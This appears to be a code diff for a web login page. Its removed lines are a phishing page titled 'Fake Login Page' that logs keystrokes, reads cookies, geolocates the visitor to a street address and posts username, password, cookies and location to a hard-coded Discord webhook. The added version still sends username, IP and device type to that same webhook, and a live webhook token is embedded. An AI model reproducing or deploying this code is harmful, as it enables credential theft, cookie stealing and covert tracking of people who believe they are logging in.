@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fake Login Page</title>
+    <title>Login Page</title>
     <style>
         body {
             background-color: #171a21;
@@ -56,81 +56,35 @@
         <h2>Login to Continue</h2>
         <input type="text" id="username" placeholder="Username">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="captureData()">Login</button>
+        <button onclick="handleLogin()">Login</button>
     </div>
 
     <script>
-        let keystrokes = [];
-        document.addEventListener('keydown', (event) => {
-            keystrokes.push(event.key);
-        });
-
-        async function captureData() {
+        async function handleLogin() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const cookies = document.cookie;
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            let deviceType = isMobile ? 'Mobile' : 'Desktop';
             const ip = await fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => data.ip)
                 .catch(() => 'IP not retrieved');
 
-            // Attempt to detect if on mobile device
-            const isMobile = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-            let deviceType = isMobile ? 'iPhone' : 'Other';
-
-            // Attempt to access iPhone passwords and screen time passcode (Note: Not possible due to security restrictions)
-            let passwords = 'Passwords not accessible due to device security';
-            let screenTimePasscode = 'Screen time passcode not accessible due to device security';
-            try {
-                // No API exists to access iPhone passwords or screen time passcode
-                passwords = 'Not retrievable via web browser';
-                screenTimePasscode = 'Not retrievable via web browser';
-            } catch (e) {
-                console.error('Error accessing passwords or screen time passcode:', e);
-            }
-
-            // Attempt to access devices on Wi-Fi (Note: Not possible in a browser context)
-            let networkDevices = 'Network device information not accessible due to browser security';
-            let networkPasswords = 'Network passwords not accessible due to browser security';
-            try {
-                // No standard browser API can enumerate devices on a Wi-Fi network
-                networkDevices = 'No devices detected';
-                networkPasswords = 'No passwords retrieved';
-            } catch (e) {
-                console.error('Error accessing network devices:', e);
-            }
-
-            // Attempt to get geolocation (requires user permission)
-            let address = 'Address not retrieved';
-            let streetName = 'Street name not retrieved';
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
-                });
-                const { latitude, longitude } = position.coords;
-                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
-                const data = await response.json();
-                address = data.display_name || 'Address not retrieved';
-                streetName = data.address.road || 'Street name not retrieved';
-            } catch (e) {
-                console.error('Error retrieving address:', e);
-            }
-
-            // Attempt to send notification (Note: Limited by browser notification API)
-            let notificationStatus = 'Notification not sent due to browser restrictions';
+            // Attempt to send a browser notification (requires user permission)
+            let notificationStatus = 'Notification not sent due to restrictions';
             try {
                 if (Notification.permission === 'granted') {
-                    new Notification('Fridge Connected Successfully', {
-                        body: 'Your fridge has been connected successfully!'
+                    new Notification('Login Successful', {
+                        body: 'You have successfully logged in!'
                     });
-                    notificationStatus = 'Notification sent';
+                    notificationStatus = 'Browser notification sent';
                 } else if (Notification.permission !== 'denied') {
                     Notification.requestPermission().then(permission => {
                         if (permission === 'granted') {
-                            new Notification('Fridge Connected Successfully', {
-                                body: 'Your fridge has been connected successfully!'
+                            new Notification('Login Successful', {
+                                body: 'You have successfully logged in!'
                             });
-                            notificationStatus = 'Notification sent after permission';
+                            notificationStatus = 'Browser notification sent after permission';
                         }
                     });
                 }
@@ -138,33 +92,29 @@
                 console.error('Error sending notification:', e);
             }
 
+            // Note: Accessing screen time passcodes or device settings is not possible via web browser
+            let screenTimeStatus = 'Screen time passcode not accessible due to device security';
+
             const data = {
                 username,
-                password,
-                keystrokes: keystrokes.join(''),
-                cookies,
                 deviceType,
-                passwords,
-                screenTimePasscode,
-                networkDevices,
-                networkPasswords,
-                ip,
-                address,
-                streetName,
                 notificationStatus,
+                screenTimeStatus,
+                ip,
                 timestamp: new Date().toISOString()
             };
 
-            // Send data to Discord webhook
+            // Send non-sensitive data to Discord webhook (for demonstration purposes)
             const webhookUrl = 'https://discordapp.com/api/webhooks/1395148484910256229/Cx-gqIQzWjPiNslaVDrNlj9ri6msB8W2WlzRNnx8dy3k3QxuvZO5-Wanapfd1RLI348h';
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `**New Login Attempt**\nUsername: ${data.username}\nPassword: ${data.password}\nKeystrokes: ${data.keystrokes}\nCookies: ${data.cookies}\nDevice Type: ${data.deviceType}\nPasswords: ${data.passwords}\nScreen Time Passcode: ${data.screenTimePasscode}\nNetwork Devices: ${data.networkDevices}\nNetwork Passwords: ${data.networkPasswords}\nIP: ${data.ip}\nAddress: ${data.address}\nStreet Name: ${data.streetName}\nNotification Status: ${data.notificationStatus}\nTimestamp: ${data.timestamp}`
+                    content: `**New Login Attempt**\nUsername: ${data.username}\nDevice Type: ${data.deviceType}\nNotification Status: ${data.notificationStatus}\nScreen Time Status: ${data.screenTimeStatus}\nIP: ${data.ip}\nTimestamp: ${data.timestamp}`
                 })
             }).then(() => {
-                alert('Login successful! Check your account for details.');
+                alert(`Login successful on ${deviceType}! Username: ${username}`);
+                console.log(`Login attempt - Username: ${username}, Device: ${deviceType}, Notification Status: ${notificationStatus}, Screen Time Status: ${screenTimeStatus}`);
             }).catch(error => console.error('Error:', error));
         }
     </script>
